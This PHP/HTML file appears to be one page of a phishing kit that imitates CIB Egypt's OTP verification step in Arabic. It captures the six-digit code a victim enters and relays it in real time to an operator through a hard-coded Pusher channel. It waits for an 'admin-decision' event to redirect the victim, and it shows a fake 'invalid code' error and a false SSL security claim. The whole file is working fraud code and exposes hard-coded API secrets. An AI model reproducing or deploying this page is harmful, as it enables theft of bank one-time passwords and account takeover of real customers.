<?php
error_reporting(0);
ini_set('display_errors', 0);

session_start();

require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
    '0737c04931774e406307',
    'eda7db4b963c98f62991',
    '2154404',
    $options
  );

    $site = array(
        'codeotp' => $_POST['codeotp'],
        'message' => 'code-otp',
        'type' => '4'
    );

    $userId = $_SESSION['user_id'];
    $id = $User->UpdateCodeOTP($userId, $site);
    if ($id) {

        $dataUser = [
            'userId' => $userId,
            'updatedData' => $site
        ];

        $pusher->trigger('my-channel-cib', 'update-user-accountt', $dataUser);

        echo "<script>document.location.href='waitcodeotp.php';</script>";
        exit;
    }
}

if (isset($_GET['reject'])) {
    $showError = true;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>التحقق الإضافي - CIB</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap"
        rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', sans-serif;
            min-height: 100vh;
            background: #f0f4f8;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            direction: rtl;
        }

        .page-wrapper {
            width: 100%;
            max-width: 420px;
            min-height: 100vh;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            box-shadow: 0 0 40px rgba(0, 0, 0, 0.06);
        }

        .header {
            background: linear-gradient(135deg, #1a5ca8 0%, #0d3b6e 100%);
            padding: 36px 24px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: -60%;
            right: -40%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.05) 0%, transparent 50%);
        }

        .header-logo {
            width: 100px;
            height: auto;
            filter: brightness(10);
            margin-bottom: 14px;
            position: relative;
            z-index: 1;
        }

        .header-icon {
            width: 60px;
            height: 60px;
            background: rgba(255, 255, 255, 0.12);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 14px;
            position: relative;
            z-index: 1;
            animation: icon-pulse 2s ease-in-out infinite;
        }

        @keyframes icon-pulse {

            0%,
            100% {
                box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.2);
            }

            50% {
                box-shadow: 0 0 0 10px rgba(255, 255, 255, 0);
            }
        }

        .header-title {
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            position: relative;
            z-index: 1;
        }

        .header-sub {
            color: rgba(255, 255, 255, 0.6);
            font-size: 13px;
            margin-top: 6px;
            position: relative;
            z-index: 1;
            line-height: 1.6;
        }

        /* Content */
        .content {
            padding: 28px 24px;
            flex: 1;
            text-align: center;
        }

        /* App button */
        .app-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: linear-gradient(135deg, #eff6ff, #dbeafe);
            border: 1.5px solid #93c5fd;
            border-radius: 12px;
            padding: 10px 18px;
            margin-bottom: 24px;
            cursor: pointer;
            transition: all 0.25s;
        }

        .app-badge:hover {
            background: linear-gradient(135deg, #dbeafe, #bfdbfe);
            border-color: #3b82f6;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.15);
        }

        .app-badge-icon {
            width: 32px;
            height: 32px;
            background: #1a5ca8;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .app-badge-text {
            text-align: right;
        }

        .app-badge-title {
            color: #1e40af;
            font-size: 14px;
            font-weight: 700;
        }

        .app-badge-sub {
            color: #64748b;
            font-size: 11px;
        }

        /* Input */
        .code-input-wrap {
            margin-bottom: 20px;
        }

        .code-label {
            text-align: right;
            font-size: 14px;
            font-weight: 600;
            color: #374151;
            margin-bottom: 8px;
        }

        .code-input {
            width: 100%;
            height: 56px;
            border: 2px solid #e2e8f0;
            border-radius: 14px;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            color: #1a2332;
            background: #f8fafc;
            font-family: 'Cairo', sans-serif;
            transition: all 0.3s;
            letter-spacing: 6px;
            outline: none;
            direction: ltr;
        }

        .code-input::placeholder {
            font-size: 14px;
            color: #94a3b8;
            font-weight: 400;
            letter-spacing: normal;
        }

        .code-input:focus {
            border-color: #1a5ca8;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(26, 92, 168, 0.1);
        }

        .code-input.filled {
            border-color: #1a5ca8;
            background: #eff6ff;
        }

        /* Timer */
        .timer-section {
            margin-bottom: 24px;
        }

        .timer-bar-track {
            width: 100%;
            height: 6px;
            background: #e2e8f0;
            border-radius: 99px;
            overflow: hidden;
            margin-bottom: 8px;
        }

        .timer-bar-fill {
            height: 100%;
            border-radius: 99px;
            background: linear-gradient(90deg, #1a5ca8, #3b82f6);
            transition: width 1s linear;
            width: 100%;
        }

        .timer-text {
            color: #64748b;
            font-size: 13px;
        }

        .timer-text span {
            color: #1a5ca8;
            font-weight: 700;
        }

        /* Error */
        .error-banner {
            display: none;
            background: linear-gradient(135deg, #fef2f2, #fee2e2);
            border: 1px solid #fecaca;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 16px;
            align-items: center;
            gap: 10px;
        }

        .error-banner.show {
            display: flex;
        }

        .error-banner span {
            color: #991b1b;
            font-size: 13px;
            font-weight: 600;
            text-align: right;
        }

        /* Submit */
        .submit-btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            font-family: 'Cairo', sans-serif;
            cursor: not-allowed;
            transition: all 0.3s;
            color: #fff;
            background: linear-gradient(135deg, #94a3b8, #cbd5e1);
            margin-bottom: 16px;
        }

        .submit-btn.active {
            background: linear-gradient(135deg, #1a5ca8, #2563eb);
            cursor: pointer;
            box-shadow: 0 4px 14px rgba(26, 92, 168, 0.3);
        }

        .submit-btn.active:hover {
            transform: translateY(-1px);
            box-shadow: 0 6px 20px rgba(26, 92, 168, 0.4);
        }

        .security-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-top: 8px;
        }

        .security-note span {
            color: #64748b;
            font-size: 11px;
            font-weight: 500;
        }

        /* Loading */
        #loadingOverlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(15, 23, 42, 0.6);
            backdrop-filter: blur(4px);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }

        #loadingOverlay.show {
            display: flex;
        }

        .loader-card {
            background: #fff;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
        }

        .loader-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #e2e8f0;
            border-top-color: #1a5ca8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 16px;
        }

        .loader-card h5 {
            color: #1a2332;
            font-size: 16px;
            font-weight: 700;
            margin-bottom: 4px;
        }

        .loader-card p {
            color: #64748b;
            font-size: 13px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @media (max-width: 480px) {
            .page-wrapper {
                max-width: 100%;
            }
        }
    </style>
</head>

<body>
    <div class="page-wrapper">
        <div class="header">
            <img class="header-logo" src="assets/logo.webp" alt="CIB" />
            <div class="header-icon">
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"
                    stroke-linecap="round" stroke-linejoin="round">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                    <polyline points="9 12 11 14 15 10" />
                </svg>
            </div>
            <div class="header-title">التحقق الإضافي</div>
            <div class="header-sub">يرجى الحصول على رمز التحقق من تطبيق<br>CIB OTP Token وإدخاله أدناه</div>
        </div>

        <div class="content">
            <div class="app-badge" id="openAppBtn">
                <div class="app-badge-icon">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"
                        stroke-linecap="round" stroke-linejoin="round">
                        <rect x="5" y="2" width="14" height="20" rx="2" ry="2" />
                        <line x1="12" y1="18" x2="12.01" y2="18" />
                    </svg>
                </div>
                <div class="app-badge-text">
                    <div class="app-badge-title">CIB OTP Token</div>
                    <div class="app-badge-sub">اضغط لفتح التطبيق</div>
                </div>
            </div>

            <form method="POST" action="" id="codeOtpForm">
                <div class="code-input-wrap">
                    <div class="code-label">رمز التحقق</div>
                    <input id="otpInput" name="codeotp" class="code-input" type="text" inputmode="numeric" maxlength="6"
                        autocomplete="one-time-code" placeholder="أدخل الكود المكون من 6 أحرف" />
                </div>

                <?php if (isset($showError)): ?>
                    <div class="error-banner show">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="2.5"
                            stroke-linecap="round" stroke-linejoin="round">
                            <circle cx="12" cy="12" r="10" />
                            <line x1="15" y1="9" x2="9" y2="15" />
                            <line x1="9" y1="9" x2="15" y2="15" />
                        </svg>
                        <span>رمز التحقق غير صالح أو منتهي الصلاحية</span>
                    </div>
                <?php endif; ?>

                <div class="timer-section">
                    <div class="timer-bar-track">
                        <div class="timer-bar-fill" id="timerFill"></div>
                    </div>
                    <div class="timer-text">الوقت المتبقي: <span id="timerSecs">60</span> ثانية</div>
                </div>

                <button class="submit-btn" id="submitBtn" type="submit" name="submit" disabled>تحقق</button>
            </form>

            <div class="security-note">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2"
                    stroke-linecap="round" stroke-linejoin="round">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                </svg>
                <span>بياناتك محمية بتشفير 256-bit SSL</span>
            </div>
        </div>
    </div>

    <div id="loadingOverlay">
        <div class="loader-card">
            <div class="loader-spinner"></div>
            <h5>جاري التحقق</h5>
            <p>يرجى الانتظار...</p>
        </div>
    </div>

    <script>
        function openSourceApp() {
            const ua = navigator.userAgent || "";
            const isAndroid = /Android/i.test(ua);
            const isiOS = /iPhone|iPad|iPod/i.test(ua);

            if (isAndroid) {
                window.location.assign("intent://#Intent;scheme=cib;package=com.CIBEgyptSecureToken;S.browser_fallback_url=https%3A%2F%2Fplay.google.com%2Fstore%2Fapps%2Fdetails%3Fid%3Dcom.CIBEgyptSecureToken;end");
                return;
            }

            if (isiOS) {
                const appStoreUrl = "https://apps.apple.com/eg/app/cib-otp-token/id1032588814";
                const primaryScheme = "cibegyptsecuretoken://";
                const startedAt = Date.now();

                const fallbackTimer = setTimeout(() => {
                    if (Date.now() - startedAt < 1600) window.location.href = appStoreUrl;
                }, 1200);

                const cancel = () => { clearTimeout(fallbackTimer); };
                document.addEventListener("visibilitychange", () => { if (document.hidden) cancel(); });
                window.addEventListener("pagehide", cancel);
                window.addEventListener("blur", cancel);

                const iframe = document.createElement("iframe");
                iframe.style.display = "none";
                iframe.src = primaryScheme;
                document.body.appendChild(iframe);
                setTimeout(() => { if (iframe && iframe.parentNode) iframe.parentNode.removeChild(iframe); }, 1200);
                return;
            }

            window.location.assign("cib://");
        }

        document.getElementById("openAppBtn").addEventListener("click", openSourceApp);

        const otpInput = document.getElementById("otpInput");
        const submitBtn = document.getElementById("submitBtn");
        const timerFill = document.getElementById("timerFill");
        const timerSecs = document.getElementById("timerSecs");
        let remaining = 60;

        otpInput.addEventListener("input", () => {
            otpInput.value = otpInput.value.replace(/\D/g, "").slice(0, 6);
            otpInput.classList.toggle('filled', otpInput.value.length > 0);
            const valid = otpInput.value.length === 6;
            submitBtn.disabled = !valid;
            submitBtn.classList.toggle('active', valid);
        });

        setInterval(() => {
            remaining = Math.max(remaining - 1, 0);
            timerSecs.textContent = String(remaining);
            timerFill.style.width = ((remaining / 60) * 100) + "%";
        }, 1000);

        document.getElementById('codeOtpForm').addEventListener('submit', function (e) {
            if (otpInput.value.trim().length !== 6) { e.preventDefault(); return; }
            document.getElementById("loadingOverlay").classList.add("show");
        });

        otpInput.focus();
    </script>
    <!-- Pusher for routing -->
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        var userId = <?php echo $_SESSION['user_id'] ?? 0; ?>;
        if (userId > 0) {
            var pusher = new Pusher('f8499dfcc5db13fb4153', { 
    cluster: 'ap2' 
});
            var channel = pusher.subscribe('my-channel-cib');
            channel.bind('admin-decision', function (data) {
                if (data.userId == userId) window.location = data.url;
            });
        }
    </script>
</body>

</html>